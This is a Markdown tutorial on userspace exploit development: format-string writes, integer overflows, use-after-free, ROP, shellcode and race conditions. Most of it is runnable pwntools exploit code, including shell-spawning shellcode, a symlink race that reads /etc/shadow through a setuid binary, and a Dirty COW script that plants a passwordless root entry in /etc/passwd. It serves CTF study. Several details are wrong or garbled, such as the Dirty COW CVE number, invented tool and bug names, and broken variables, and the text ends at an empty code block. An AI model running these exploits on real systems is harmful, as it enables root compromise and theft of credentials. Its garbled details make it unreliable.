# Userspace Exploit Development — Advanced Techniques & Modern Methods

A deep-dive reference for format strings, integer bugs, type confusion, advanced ROP, shellcode, race conditions, and exploit reliability. Each section includes working pwntools code examples drawn from real CTF challenges and vulnerability classes.

---

## Table of Contents

1. [Format String Exploitation](#1-format-string-exploitation)
2. [Integer Overflow/Underflow Exploitation](#2-integer-overflowunderflow-exploitation)
3. [Type Confusion & Use-After-Free in Userspace](#3-type-confusion--use-after-free-in-userspace)
4. [Advanced ROP & Chaining](#4-advanced-rop--chaining)
5. [Shellcode Techniques](#5-shellcode-techniques)
6. [Exploiting Race Conditions (Userspace)](#6-exploiting-race-conditions-userspace)
7. [Exploit Reliability & Engineering](#7-exploit-reliability--engineering)

---

## 1. Format String Exploitation

### 1.1 Mechanics — Stack Layout & Direct Parameter Access

When `printf(user_input)` is called, the format string is read from the stack. Each format specifier (`%x`, `%d`, `%s`, etc.) consumes the next argument on the stack (or in registers, per the x86_64 calling convention: `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`, then the stack).

On x86_64, the first six arguments go in registers, so format string offsets begin at `%6$x` (the 7th argument = first stack argument) in a typical `printf(buf)` scenario where `buf` is in `rdi`.

**Direct parameter access** using `$` notation (`%10$lx`) lets you read/write any offset without consuming earlier arguments:

```
Stack (growing downward):
  arg0 (rdi)  = fmt string itself
  arg1 (rsi)  = %1$llx
  arg2 (rdx)  = %2$llx
  ...
  arg6 (stack)= %6$llx   <-- first stack-based argument
```

### 1.2 Reading Arbitrary Memory

```python
from pwn import *

p = process("./vuln_fmt")

# Leak a stack address (offset depends on binary — find with trial)
p.sendline(b"%6$llx")
leak = int(p.recvline().strip(), 16)
log.info(f"Stack leak: {hex(leak)}")

# Leak a string at a known address (e.g., GOT entry pointing to libc)
got_printf = 0x404018
payload = f"%7$s".encode()
payload += b"AAAA"          # padding so %7$ points to our address
payload += p64(got_printf)
p.sendline(payload)
printf_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"printf@GLIBC: {hex(printf_addr)}")
```

The `%s` specifier dereferences the pointer at the corresponding offset and prints until a null byte. The address must be placed in the payload at an offset that aligns with a format parameter index.

### 1.3 Writing Arbitrary Memory — %n, %hn, %hhn

| Specifier | Width       | Example Output             |
|-----------|-------------|----------------------------|
| `%n`      | 4 bytes     |Writes count as `int`       |
| `%hn`     | 2 bytes     |Writes count as `short`     |
| `%hhn`    | 1 byte      |Writes count as `char`      |
| `%ln`     | 8 bytes     |Writes count as `long`      |

The value written equals the number of characters printed so far. To write `0xdead` to an address:

```
%54575c%8$hn    # 54575 = 0xdead, prints that many chars, then writes
```

**Chunked write strategy** — write two or four bytes at a time to avoid enormous output:

```python
from pwn import *

def fmt_write(addr, value, offset):
    """Prepare a format string payload that writes `value` (16-bit chunks) to `addr`."""
    # Split into two 16-bit writes (little-endian)
    low  = value & 0xffff
    high = (value >> 16) & 0xffff

    # We need two target addresses on the stack
    payloads = []
    sizes    = []
    addrs    = [addr, addr + 2]

    for i, (target_val, target_addr) in enumerate(zip([low, high], addrs)):
        if target_val == 0:
            payloads.append(f"%{offset + i}$hn")
            sizes.append(0)
        else:
            payloads.append(f"%{target_val}c%{offset + i}$hn")
            sizes.append(target_val)

    # Addresses go at the end; pad to 8-byte alignment
    fmt = "".join(payloads)
    pad = (8 - (len(fmt) % 8)) % 8
    fmt += " " * pad
    result = fmt.encode() + p64(addrs[0]) + p64(addrs[1])
    return result

# Usage: overwrite __free_hook with system
target = elf.symbols["__free_hook"]   # or libc.symbols["__free_hook"]
value  = libc.symbols["system"]
offset = 8   # determined empirically

payload = fmt_write(target, value, offset)
p.sendline(payload)
```

### 1.4 Bypassing Protections

- **FORTIFY_SOURCE**: Replaced `printf` with `__printf_chk` which rejects `%n` in writable segments. Bypass: if you can write to `.rodata` or if the binary uses a custom `printf` wrapper that calls `vprintf` without fortify.
- **PIE**: Offset-based; leak a code pointer first, then calculate relative addresses.
- **ASLR**: Leak a libc address from GOT, then compute target.
- **RELRO (Full)**: Can't overwrite GOT. Target `__malloc_hook` / `__free_hook` (pre-glibc 2.34) or use format string to corrupt `_IO_FILE` vtable pointer (modern technique).

### 1.5 pwntools fmtstr_payload Automation

pwntools provides `fmtstr_payload` which automates the entire construction:

```python
from pwn import *

elf  = ELF("./vuln_fmt")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p = process("./vuln_fmt")

# Step 1: Leak libc
p.sendline(b"%9$sAAAA" + p64(elf.got["puts"]))
puts_addr = u64(p.recvuntil(b"AAAA")[:-4].ljust(8, b'\x00'))
libc.address = puts_addr - libc.symbols["puts"]
log.info(f"libc base: {hex(libc.address)}")

# Step 2: Overwrite __free_hook -> one_gadget
target_addr = libc.symbols["__free_hook"]
target_val  = libc.address + 0xe6c7e   # one_gadget offset

# offset = stack offset to our buffer (determine with cyclic + %p)
payload = fmtstr_payload(8, {target_addr: target_val}, write_size='short')
p.sendline(payload)

# Step 3: Trigger free(buf) -> system(buf)
p.sendline(b"/bin/sh\x00")
p.interactive()
```

### 1.6 Real CTF Format String Examples

**PlaidCTF 2015 — "plaidboard"**

The binary called `printf(buf)` directly. The exploit:

1. Leak a stack pointer with `%6$lx` and libc with `%9$s` + GOT address.
2. Use the stack leak to find the return address location.
3. Overwrite the return address with a one-gadget using `%hhn` writes (byte-at-a-time for reliability).

```python
from pwn import *

p = remote("plaidboard.pwn", 9999)

# Leak stack
p.sendlineafter(b"> ", b"%6$lx")
stack = int(p.recvline(), 16)
ret_addr_loc = stack + 0x40

# Leak libc via GOT
p.sendlineafter(b"> ", b"%9$s" + p64(0x404018))
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc = ELF("libc.so.6")
libc.address = libc_leak - libc.symbols["puts"]

# Write one_gadget to ret_addr using fmtstr_payload
writes = {ret_addr_loc: libc.address + 0xe6c81}
payload = fmtstr_payload(10, writes, write_size='byte')
p.sendlineafter(b"> ", payload)
p.interactive()
```

---

## 2. Integer Overflow/Underflow Exploitation

### 2.1 Integer Wrapping in Memory Operations

When an unsigned integer wraps around, `0xFFFFFFFF + 1 = 0`. This can be abused to pass size checks while allocating tiny buffers, then overflow them.

```c
// Vulnerable pattern
void vuln(unsigned int size) {
    if (size < 0x100) return;            // check looks safe
    char *buf = malloc(size + 1);        // size+1 wraps if size == 0xFFFFFFFF
    read(0, buf, 0x200);                 // writes past the tiny allocation
}
```

`0xFFFFFFFF + 1 = 0`, so `malloc(0)` returns a tiny chunk, but `read(0, buf, 0x200)` writes 512 bytes past it.

### 2.2 Signed/Unsigned Confusion

```c
int copy_data(int len, char *src) {
    if (len > MAX_SIZE) return -1;     // signed comparison
    char buf[MAX_SIZE];
    memcpy(buf, src, len);              // len treated as size_t (unsigned)
    // If len = -1 (0xFFFFFFFF), the check passes but memcpy copies ~4GB
}
```

### 2.3 Truncation Issues

Assigning a 64-bit value to a 32-bit field truncates the upper bits:

```c
struct header {
    uint32_t size;       // only lower 32 bits stored
    uint32_t flags;
};

void process(uint64_t user_size) {
    struct header h;
    h.size = user_size;      // truncation: 0x100000001 -> 1
    if (h.size > 0x1000)
        return -1;
    // h.size == 1, check passes but original user_size was huge
    void *buf = malloc(h.size);
    memcpy(buf, user_data, user_size);   // original 64-bit size used!
}
```

### 2.4 CTF Example: Heap Integer Overflow

**Defcon Quals 2021 — "heap-int"** (simplified):

```c
void create_chunk(unsigned int idx, unsigned int size) {
    if (idx >= 16 || size > 0x400) return;    // size check
    chunks[idx] = malloc(size);
    sizes[idx] = size;
}

void edit_chunk(unsigned int idx, unsigned int size) {
    if (idx >= 16) return;
    // BUG: no size check on edit; can supply size > sizes[idx]
    read(0, chunks[idx], size);   // heap overflow
}
```

Exploit:

```python
from pwn import *

p = process("./heap_int")
elf = ELF("./heap_int")
libc = ELF("./libc.so.6")

def create(idx, size, data):
    p.sendline(b"1")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)

def edit(idx, size, data):
    p.sendline(b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())   # no bound check
    p.sendafter(b"data: ", data)

# Allocate a small chunk
create(0, 0x18, b"A" * 0x18)

# Overflow into next chunk's metadata
edit(0, 0x100, b"A" * 0x18 + p64(0) + p64(0x31) + p64(0) * 4)
# ... tcache poisoning, etc.
p.interactive()
```

### 2.5 pwntools Convenience: Handling Integer Wrapping

```python
from pwn import *

def wrap32(val):
    """Simulate 32-bit unsigned wrapping."""
    return val & 0xFFFFFFFF

# Craft size that passes check but wraps in allocation
size = 0xFFFFFFFF  # passes size < 0x100? No.
# For size < 0x100 check with malloc(size + 1):
# We need size where size < 0x100 is FALSE (bypass check)
# and (size + 1) wraps to small value.
# That's impossible with 32-bit arithmetic on 64-bit malloc.
# But if the check uses signed comparison:
size = 0x80000000  # INT_MIN: negative in signed, huge in unsigned
# signed comparison: -2147483648 < 0x100? YES → passes
# malloc(0x80000000) → large allocation, may fail
# For a 16-bit truncation scenario:
big_size = 0x10000 + 0x10   # truncated to 0x10

log.info(f"Wrapped: {hex(wrap32(0xFFFFFFFF + 1))}")  # 0x0
```

---

## 3. Type Confusion & Use-After-Free in Userspace

### 3.1 C++ Vtable Exploitation

In C++, virtual method calls go through a vtable pointer stored at offset 0 of every object. If an object is freed but pointers to it remain (UAF), the vtable pointer can be corrupted to redirect execution.

```c
class Base {
public:
    virtual void do_thing() { puts("Base::do_thing"); }
};

class Evil {
public:
    virtual void do_thing() { system("/bin/sh"); }
};

Base *obj = new Base();
delete obj;                    // freed, but 'obj' still holds the pointer
// obj->do_thing() now dereferences freed heap -> vtable -> controlled function
```

The exploit path:

1. Free a C++ object with a vtable.
2. Allocate a new object (e.g., a string buffer) that overlaps the freed object's memory.
3. Craft a fake vtable inside the string data.
4. Write the address of `system` at the appropriate vtable slot.
5. Call the virtual method — it follows the corrupted vtable to `system`.

### 3.2 Object Lifetime Issues

UAF occurs when:
- An object is freed/deallocated.
- A dangling pointer still references it.
- The dangling pointer is later dereferenced.

Common patterns:
- **Callback after free**: Object unregistered from observer list but callback still queued.
- **Iterator invalidation**: STL iterator used after container modification.
- **Re-entering during destructor**: Virtual dispatch during object destruction.

### 3.3 UAF Exploitation Pattern in Browsers

Browser exploits (Chrome/V8, Firefox/SpiderMonkey) heavily rely on UAF via type confusion:

```
1. Trigger GC that collects a JS object
2. Reallocate the cell with a different type (type confusion)
3. Access the object through the old reference
4. The old reference treats the memory as old type → controlled type confusion
5. Use the confusion to get addrof/fakeobj primitives
6. Achieve arbitrary R/W → ROP → shell
```

**Chrome V8 example pattern:**

```javascript
// Simplified: TurboStall type confusion
class Obj {
    constructor() { this.x = 1.1; }
}

let arr = [1.1, 2.2, 3.3];
let trigger = new Obj();

// JIT compiles assuming trigger is Obj type
// Turbofan eliminates type check after certain conditions
// Forge the object to confuse int and float representation
// This gives us addrof (object addr as float) and fakeobj (float as object ptr)

function addrof(obj) {
    arr[0] = obj;          // store object
    trigger.x = arr[0];   // read as float → address leaked
    return trigger.x;
}

function fakeobj(addr) {
    trigger.x = addr;     // store float
    arr[0] = trigger.x;   // read as object → fake reference
    return arr[0];
}
```

### 3.4 Redelegation and Re-type-confusion

When a freed object is reallocated with a different type:

```c
struct User {
    void (*callback)(char *);
    char name[32];
};

struct Message {
    char text[48];    // overlaps with User when same size class
};

// Free a User object
User *u = (User *)malloc(sizeof(User));
free(u);

// Reallocate as Message — fills old User memory with controlled data
Message *m = (Message *)malloc(sizeof(Message));
strcpy(m->text, controlled_data);   // overwrite User::callback!

u->callback("/bin/sh");   // dangling ptr → calls controlled address
```

**pwntools exploit for simple UAF:**

```python
from pwn import *

p = process("./uaf_vuln")
elf = ELF("./uaf_vuln")
libc = ELF("./libc.so.6")

def alloc(size, data):
    p.sendline(b"1")
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)

def free_obj(idx):
    p.sendline(b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

def use(idx, arg):
    p.sendline(b"3")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"arg: ", arg)

system_addr = libc.symbols["system"]

# Allocate and free an object with a function pointer
alloc(0x40, b"A" * 0x40)     # idx 0
free_obj(0)                    # free it

# Reallocate same size — tcache gives back same chunk
# Overwrite the vtable/function pointer at the start
payload = p64(system_addr) + b"/bin/sh\x00"
alloc(0x40, payload)           # idx 1, overlaps with freed chunk 0

# Use the dangling pointer (idx 0) → calls system("/bin/sh")
use(0, b"")
p.interactive()
```

---

## 4. Advanced ROP & Chaining

### 4.1 Partial Overwrites (Avoiding Null Bytes)

When a `read()` or `recv()` doesn't append a null terminator, you may overflow only the lowest bytes of a saved return address. If the binary is non-PIE, you can overwrite just the last 1–2 bytes to redirect within the same page:

```python
from pwn import *

p = process("./vuln_partial")
elf = ELF("./vuln_partial")

# Suppose return address is 0x08049123 and we want 0x08049256
# Only need to overwrite the last 2 bytes
# But read() stops at \x00, so avoid null bytes in the overwrite

target = 0x08049256
low2 = target & 0xffff       # 0x9256 — no null bytes
payload = b"A" * offset + p16(low2)
```

For PIE binaries, partial overwrite of the least significant byte gives you 256 possible alignments on the same page (1/16 chance if page-aligned code):

```python
# PIE binary — overwrite only LSB of return address
# Original ret addr likely ends in 0x??a (aligned)
# Redirect to gadget in same page
payload  = b"A" * offset
payload += p8(0x0a)  # single byte overwrite — 1/16 chance of hitting valid gadget
```

### 4.2 Stack Piercing

Stack piercing means using ROP to set up a second stack (fake stack frame) in a controlled memory region, then pivoting to it. This is essential when the original stack is too constrained (small overflow, corrupted).

```python
from pwn import *

p = process("./vuln_pierce")
elf = ELF("./vuln_pierce")
libc = ELF("./libc.so.6")

# Gadgets
leave_ret = 0x08048558     # leave; ret
pop_eax_ret = 0x08049232
mov_esp_eax = 0x08049189   # mov esp, eax; ret (stack pivot gadget)

# Fake stack in .bss
fake_stack = elf.bss() + 0x200

# Phase 1: Overflow to pivot to fake stack
payload  = b"A" * offset
payload += p32(pop_eax_ret)
payload += p32(fake_stack)
payload += p32(mov_esp_eax)   # ESP = fake_stack, execution continues there

# Phase 2: Build full ROP chain on fake stack
rop = ROP(elf)
rop.call("execve", [b"/bin/sh", 0, 0])

# Write fake stack contents using write primitive
# (e.g., format string, arbitrary write, etc.)
write_to(fake_stack, rop.chain())

p.sendline(payload)
p.interactive()
```

### 4.3 ROP with Constrained Character Sets

When input is filtered (e.g., only alphanumeric, no null bytes, no spaces), build ROP chains from constrained gadgets:

```python
from pwn import *

# Find gadgets that only use allowed bytes
# ropgadget --binary vuln --only "pop|ret" --badbytes "00 0a 20"

# For alphanumeric-only constraints:
# Use encoder ROT13-inspired approach or use msfvenotable
# pwntools can help filter:

def is_printable(gadget_bytes):
    return all(0x20 <= b < 0x7f for b in gadget_bytes)

# Alternative: use libc gadgets which offer more variety
# libc usually has gadgets for all register pops

# Build chain avoiding \x00 bytes — use addresses that don't contain nulls
# On x86_64, libc addresses typically start with 0x7f — no null bytes in lower 6 bytes
rop = ROP(libc)
rop.call("system", [next(libc.search(b"/bin/sh"))])
chain = rop.chain()
assert b'\x00' not in chain, "Chain contains null bytes!"
```

### 4.4 JOP — Jump-Oriented Programming

JOP replaces `ret`-based dispatch with indirect jumps through a dispatch table. Each "gadget" ends with `jmp [dispatch_table + offset]` instead of `ret`.

**Gadget pattern:**

```asm
; JOP gadget: load function pointer from rax, call it
mov rax, [rbx+8]
call rax
add rbx, 0x10
jmp [dispatch]       ; link to next gadget in dispatch table
```

**Dispatch table** (in controlled memory):

```python
from pwn import *

# Build a dispatch table
dispatch = elf.bss() + 0x400

# Each entry: [function_pointer, next_gadget_addr]
entries = [
    p64(0xdeadbeef) + p64(gadget1_addr),   # entry 0
    p64(0xcafebabe) + p64(gadget2_addr),   # entry 1
    p64(0x41414141) + p64(gadget3_addr),   # entry 2
]

# Write dispatch table to memory using arbitrary write primitive
for i, entry in enumerate(entries):
    write_to(dispatch + i * 16, entry)

# Initial trigger: set rbx to dispatch table start, jump to first gadget
payload  = b"A" * offset
payload += p64(pop_rbx_ret) + p64(dispatch)
payload += p64(jop_dispatcher_gadget)
```

JOP is useful when:
- Stack is non-executable AND `ret` gadgets are scarce.
- CET (Control-flow Enforcement Technology) blocks return-oriented programming.
- You need to bypass shadow stacks.

### 4.5 DOP — Data-Oriented Programming

DOP doesn't hijack control flow at all. Instead, it modifies critical data variables to change program behavior. This bypasses CFI, CET, and shadow stacks entirely.

**Example — Modifying the `auth` flag:**

```c
// Vulnerable: arbitrary write via buffer overflow
int authenticated = 0;   // .bss
int main() {
    char buf[64];
    read(0, buf, 256);    // overflow past buf into authenticated
    if (authenticated) {
        system("/bin/sh");
    }
}
```

**DOP exploit:**

```python
from pwn import *

p = process("./dop_vuln")
elf = ELF("./dop_vuln")

# Overwrite authenticated flag (located at .bss + offset)
auth_addr = elf.symbols["authenticated"]
overflow_offset = 64 + 8    # buf size + saved rbp (or whatever padding)

payload  = b"A" * overflow_offset
payload += p32(1)            # authenticated = 1
p.sendline(payload)
p.interactive()
```

**Advanced DOP — corrupting function pointer tables:**

```python
# Overwrite the __free_hook or __malloc_hook (pre-glibc 2.34)
# Or corrupt a C++ vtable pointer
# Or modify a file descriptor table entry
# Or change a length field to enable further reads

from pwn import *

p = process("./dop_vuln2")
elf = ELF("./dop_vuln2")
libc = ELF("./libc.so.6")

# Known arbitrary write primitive (e.g., via format string)
# Write system address to __free_hook
target = libc.symbols["__free_hook"]
value  = libc.symbols["system"]

payload = fmtstr_payload(offset, {target: value})
p.sendline(payload)

# Trigger: free a chunk containing "/bin/sh"
p.sendline(b"/bin/sh")
p.interactive()
```

### 4.6 Ret2dlresolve

`ret2dlresolve` forges a fake `Elf64_Sym`, `Elf64_Rela`, and string table entry so that the dynamic linker resolves `system` for us — no libc leak needed.

```python
from pwn import *

p = process("./ret2dlresolve_vuln")
elf = ELF("./ret2dlresolve_vuln")

rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop.read(0, dlresolve.data_addr)            # read fake structures into memory
rop.ret2dlresolve(dlresolve)                 # trigger resolution

payload  = b"A" * offset
payload += rop.chain()

p.sendline(payload)
p.sendline(dlresolve.payload)               # send fake structures data
p.interactive()
```

The `Ret2dlresolvePayload` object constructs:
- A fake `.dynstr` entry containing `"system\0"`.
- A fake `Elf64_Sym` pointing to that string.
- A fake `Elf64_Rela` pointing to that symbol.
- The PLT stub resolves using this fake data and calls `system("/bin/sh")`.

### 4.7 Ret2vdso

The VDSO (Virtual Dynamic Shared Object) is mapped at a fixed (or semi-fixed) address and contains useful gadgets, especially on kernels where ASLR is weak for VDSO (older kernels, 32-bit).

```python
from pwn import *

p = process("./ret2vdso_vuln")

# Leak VDSO address from /proc/self/maps or via side channel
# On 32-bit, VDSO is at a predictable address
# On 64-bit with modern kernels, VDSO is randomized

# Typical VDSO gadgets (kernel-specific):
# 0xffffffffff600000: syscall; ret  (on some kernels)
# 0xffffffffff600400: clock_gettime fallback

# To find gadgets:
# $ objdump -d -M intel /lib/modules/$(uname -r)/vdso/vdso.so

vdso_base = 0xffffffffff600000  # example, may vary
syscall_ret = vdso_base + 0x500  # offset of `syscall; ret` gadget

rop = ROP(elf)
# Set up registers for execve(0x3b)
rop.call(pop_rdi_ret, [0x3b])       # syscall number
rop.call(pop_rsi_ret, [0])          # arg1
rop.call(pop_rdx_ret, [0])          # arg2
rop.call(syscall_ret)               # trigger

payload  = b"A" * offset
payload += rop.chain()
p.sendline(payload)
p.interactive()
```

VDSO exploitation is most practical when:
- You can leak the VDSO base (via info leak or `/proc/self/maps`).
- The target kernel has useful gadgets in the VDSO page.
- You need a `syscall; ret` gadget that's not in the main binary.

---

## 5. Shellcode Techniques

### 5.1 Custom x86_64 Shellcode

**Standard execve("/bin/sh") shellcode:**

```python
from pwn import *

context.arch = 'amd64'

shellcode = asm("""
    xor rsi, rsi          /* arg2 = NULL */
    mul rsi               /* rax = 0 */
    /* push /bin/sh onto stack */
    push rax
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp          /* arg1 = "/bin/sh" */
    mov al, 59            /* syscall 59 = execve */
    syscall
""")
log.info(f"Shellcode length: {len(shellcode)}")
# 22 bytes

p = process("./shellcode_vuln")
p.sendline(shellcode)
p.interactive()
```

### 5.2 Shellcode Encoding and Obfuscation

When filters block certain bytes, encode the shellcode and prepend a decoder stub:

```python
from pwn import *

context.arch = 'amd64'

# Original shellcode
original = asm(shellcraft.sh())

# XOR encode with key 0x42
key = 0x42
encoded = bytes([b ^ key for b in original])

# Decoder stub: decode in place, then jump to shellcode
# Decoder assumes shellcode is at rdi (or another known register)
decoder = asm("""
    lea rsi, [rip + encoded_data]  /* pointer to encoded shellcode */
    mov rcx, SHELLCODE_LEN
decode_loop:
    xor byte ptr [rsi + rcx - 1], 0x42
    loop decode_loop
    jmp rsi
""")

payload = decoder + b"encoded_data_placeholder"
payload = payload.replace(b"encoded_data_placeholder", encoded)
# Fix up SHELLCODE_LEN reference...

# Simpler approach: use pwntools XOR encoder
from pwnlib.encoders.dxor import dxor_encode

forbidden = [0x00, 0x0a, 0x0d]   # null, newline, carriage return
shellcode = asm(shellcraft.sh())
encoded_shellcode = dxor_encode(shellcode, forbidden)
log.info(f"Encoded length: {len(encoded_shellcode)}")
```

### 5.3 Alphanumeric Shellcode

When only `[A-Za-z0-9]` bytes are allowed (0x30–0x39, 0x41–0x5A, 0x61–0x7A):

```python
from pwn import *

context.arch = 'amd64'

# Technique: use only alphanumeric instructions as a decoder
# Known alphanumeric x86_64 gadgets:
#   push/pop (0x41-0x5A for registers)
#   XCHG (0x86.. with alphanumeric operands)
#   imul/add/sub with small constants

# Use a known alphanumeric decoder stub
# After decoder: real shellcode written to stack and executed

# Shortcut: msfvenom can generate alphanumeric shellcode
# $ msfvenom -p linux/x64/exec CMD="/bin/sh" -f python -e x64/alpha_mixed

alpha_stub = (
    b"PYj0X40PPPPPPPPPPPP"      # pushad / adjust
    b"Qh0f0fX40502020"           # more alpha adjustments
    b"Qh0fX40502020"             # ...
)
# This example is illustrative; use tools for real alpha shellcode
```

**Practical approach — use pwntools encoder:**

```python
from pwn import *

context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

# Encode avoiding all non-alphanumeric bytes
allowed = set(range(0x30, 0x3A)) | set(range(0x41, 0x5B)) | set(range(0x61, 0x7B))
forbidden = [i for i in range(256) if i not in allowed]

from pwnlib.encoders.dxor import dxor_encode
encoded = dxor_encode(shellcode, forbidden)
assert all(b in allowed for b in encoded), "Non-alphanumeric bytes remain!"
```

### 5.4 One-Gadgets in glibc

One-gadgets are pre-found `execve("/bin/sh", NULL, NULL)` sequences in libc that only require specific register/stack constraints:

```python
from pwn import *

p = process("./one_gadget_vuln")
libc = ELF("./libc.so.6")

# Find one-gadgets using the one_gadget tool
# $ one_gadget ./libc.so.6
# 0xe6c7e execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL
#
# 0xe6c81 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

one_gadget_offsets = [0xe6c7e, 0xe6c81, 0xe6c84, 0xe6c8e]

# Leak libc, then try one-gadgets
p.sendline(b"%9$sAAAA" + p64(elf.got["puts"]))
leak = u64(p.recvuntil(b"AAAA")[:-4].ljust(8, b'\x00'))
libc.address = leak - libc.symbols["puts"]

for offset in one_gadget_offsets:
    try:
        p2 = process("./one_gadget_vuln")
        target = libc.address + offset
        # Overwrite return address or hook with one_gadget
        payload = b"A" * offset_to_ret + p64(target)
        p2.sendline(payload)
        p2.timeout = 0.5
        if b"$" in p2.recv(1024) or b"#" in p2.recv(1024):
            log.success(f"One-gadget at {hex(offset)} works!")
            p = p2
            break
        p2.close()
    except:
        continue
```

### 5.5 Shellcode for Constrained Environments (Seccomp)

When `seccomp` filters restrict syscalls, you must work within the allowed syscall set:

```python
from pwn import *

context.arch = 'amd64'

# Common seccomp restrictions:
# - Only read, write, open allowed (no execve)
# - Only read, write, open, mmap allowed
# - Architecture-specific filtering

# Strategy: open("./flag", O_RDONLY) -> read(fd, buf, size) -> write(1, buf, size)

shellcode = asm("""
    /* open("./flag", O_RDONLY) */
    lea rdi, [rip + flag_path]
    xor rsi, rsi          /* O_RDONLY = 0 */
    xor rdx, rdx
    mov rax, 2            /* syscall 2 = open */
    syscall

    /* read(fd, buf, size) */
    mov rdi, rax           /* fd from open */
    lea rsi, [rip + flag_path]  /* reuse buffer */
    mov rdx, 0x100         /* size */
    mov rax, 0             /* syscall 0 = read */
    syscall

    /* write(1, buf, count) */
    mov rdx, rax           /* count from read */
    mov rdi, 1             /* stdout */
    lea rsi, [rip + flag_path]
    mov rax, 1             /* syscall 1 = write */
    syscall

    /* exit(0) */
    mov rdi, 0
    mov rax, 60
    syscall

flag_path:
    .asciz "./flag"
""")
log.info(f"Seccomp shellcode length: {len(shellcode)}")

p = process("./seccomp_vuln")
p.sendline(shellcode)
flag = p.recvall()
log.success(f"Flag: {flag}")
```

**Advanced seccomp — ORW with sendfile (when read/write are blocked but sendfile is allowed):**

```python
context.arch = 'amd64'

shellcode = asm("""
    /* open("./flag", 0) */
    lea rdi, [rip + flag]
    xor esi, esi
    mov eax, 2
    syscall

    /* sendfile(1, fd, NULL, 0x1000) */
    mov rdi, 1            /* stdout */
    mov rsi, rax          /* fd */
    xor rdx, rdx          /* offset = NULL */
    mov r10, 0x1000       /* count */
    mov rax, 40           /* sendfile */
    syscall

flag:
    .asciz "./flag"
""")
```

---

## 6. Exploiting Race Conditions (Userspace)

### 6.1 TOCTOU — Time-of-Check to Time-of-Use

The classic race: a program checks a condition, then acts on it, but the condition changes between check and use.

```c
// Vulnerable setuid program
int fd = open(argv[1], O_RDONLY);  // Check: opens user-controlled file
if (fstat(fd, &st) || st.st_uid != getuid()) {
    close(fd);
    exit(1);                       // Rejects if file isn't owned by user
}
// ... time passes ...
char buf[1024];
read(fd, buf, sizeof(buf));        // Use: reads from fd
// BUT: fd could now point to /etc/shadow if symlink was swapped!
```

**Exploit:**

```python
from pwn import *
import os, threading, time

SUID_BIN = "./vuln_tocotou"
TARGET   = "/etc/shadow"
LINK     = "/tmp/race_link"

def symlink_race():
    """Continuously swap symlink between safe file and target."""
    safe_file = "/etc/hostname"
    while True:
        os.unlink(LINK)
        os.symlink(safe_file, LINK)
        os.unlink(LINK)
        os.symlink(TARGET, LINK)

# Start race thread
threading.Thread(target=symlink_race, daemon=True).start()

# Repeatedly invoke the SUID binary
while True:
    p = process([SUID_BIN, LINK])
    output = p.recvall(timeout=0.5)
    if b"root:" in output:
        log.success(f"Won the race! Got: {output[:200]}")
        break
    p.close()
```

### 6.2 Dirty COW (CVE-2016-5193) — Userspace Perspective

Dirty COW is a kernel race condition, but it's exploited entirely from userspace. The bug: `get_user_pages()` doesn't properly handle copy-on-write pages during a write fault that races with `madvise(MADV_DONTNEED)`.

```python
# Simplified Dirty COW exploit (Linux kernel < 4.8.3)
# This exploits the race in /proc/self/mem write vs. MADVISE_DONTNEED

from pwn import *
import mmap, threading, os

context.arch = 'amd64'

TARGET_FILE = "/etc/passwd"   # read-only file we want to modify
NEW_ENTRY   = b"root2::0:0::/root:/bin/sh\n"

def write_thread(mem_fd, mapped_area, new_content):
    """Continuously write new content to the mapped area."""
    while True:
        os.lseek(mem_fd, mapped_area, os.SEEK_SET)
        os.write(mem_fd, new_content)

def madvise_thread(mapped_area, length):
    """Continuously advise kernel to drop the page (triggers COW race)."""
    while True:
        os.madvise(mapped_area, length, os.MADV_DONTNEED)

# Open target and map it
fd = os.open(TARGET_FILE, os.O_RDONLY)
mapped = mmap.mmap(fd, 4096, prot=mmap.PROT_READ, flags=mmap.MAP_PRIVATE)
mapped_area = ctypes.addressof(ctypes.c_char.from_buffer(mapped))

# Open /proc/self/mem for writing
mem_fd = os.open("/proc/self/mem", os.O_RDWR)

# Start racing threads
t1 = threading.Thread(target=write_thread, args=(mem_fd, mapped_area, NEW_ENTRY), daemon=True)
t2 = threading.Thread(target=madvise_thread, args=(mapped_area, 4096), daemon=True)
t1.start()
t2.start()

# Check if we won
time.sleep(5)
mapped.seek(0)
if NEW_ENTRY[:5] in mapped.read(4096):
    log.success("Dirty COW succeeded!")
else:
    log.failure("Race not won, try again")
```

### 6.3 Symbolic Link Race Exploitation

```bash
# Classic exploitation sequence:
# 1. Attacker creates symlink: ln -s /etc/shadow /tmp/attacker_link
# 2. SUID root program checks /tmp/attacker_link ownership
# 3. Between check and use, attacker replaces link:
#    rm /tmp/attacker_link
#    ln -s /etc/shadow /tmp/attacker_link
# 4. Program reads the now-dangling target as root
```

**Automated race with inotify:**

```python
from pwn import *
import os, threading

SUID_PROG = "./backup_tool"
WATCH_DIR = "/tmp/backup_src"
LINK      = f"{WATCH_DIR}/data"

def race():
    while True:
        try:
            os.unlink(LINK)
            os.symlink("/etc/shadow", LINK)
            os.unlink(LINK)
            os.symlink("/etc/hostname", LINK)
        except FileNotFoundError:
            pass

threading.Thread(target=race, daemon=True).start()

for _ in range(1000):
    p = process([SUID_PROG, WATCH_DIR])
    data = p.recvall(timeout=1)
    if b"root:" in data:
        log.success("Won symlink race!")
        break
```

### 6.4 Multi-threaded Race Exploitation

When a shared resource is accessed by multiple threads without proper locking:

```c
// Thread 1: check balance
if (account->balance >= amount) {
    // Thread 2: also checks and sees the same balance
    // Thread 1: deducts
    account->balance -= amount;
    // Thread 2: deducts again (double spend!)
    account->balance -= amount;
}
```

**Exploiting multi-threaded races with timing control:**

```python
from pwn import *
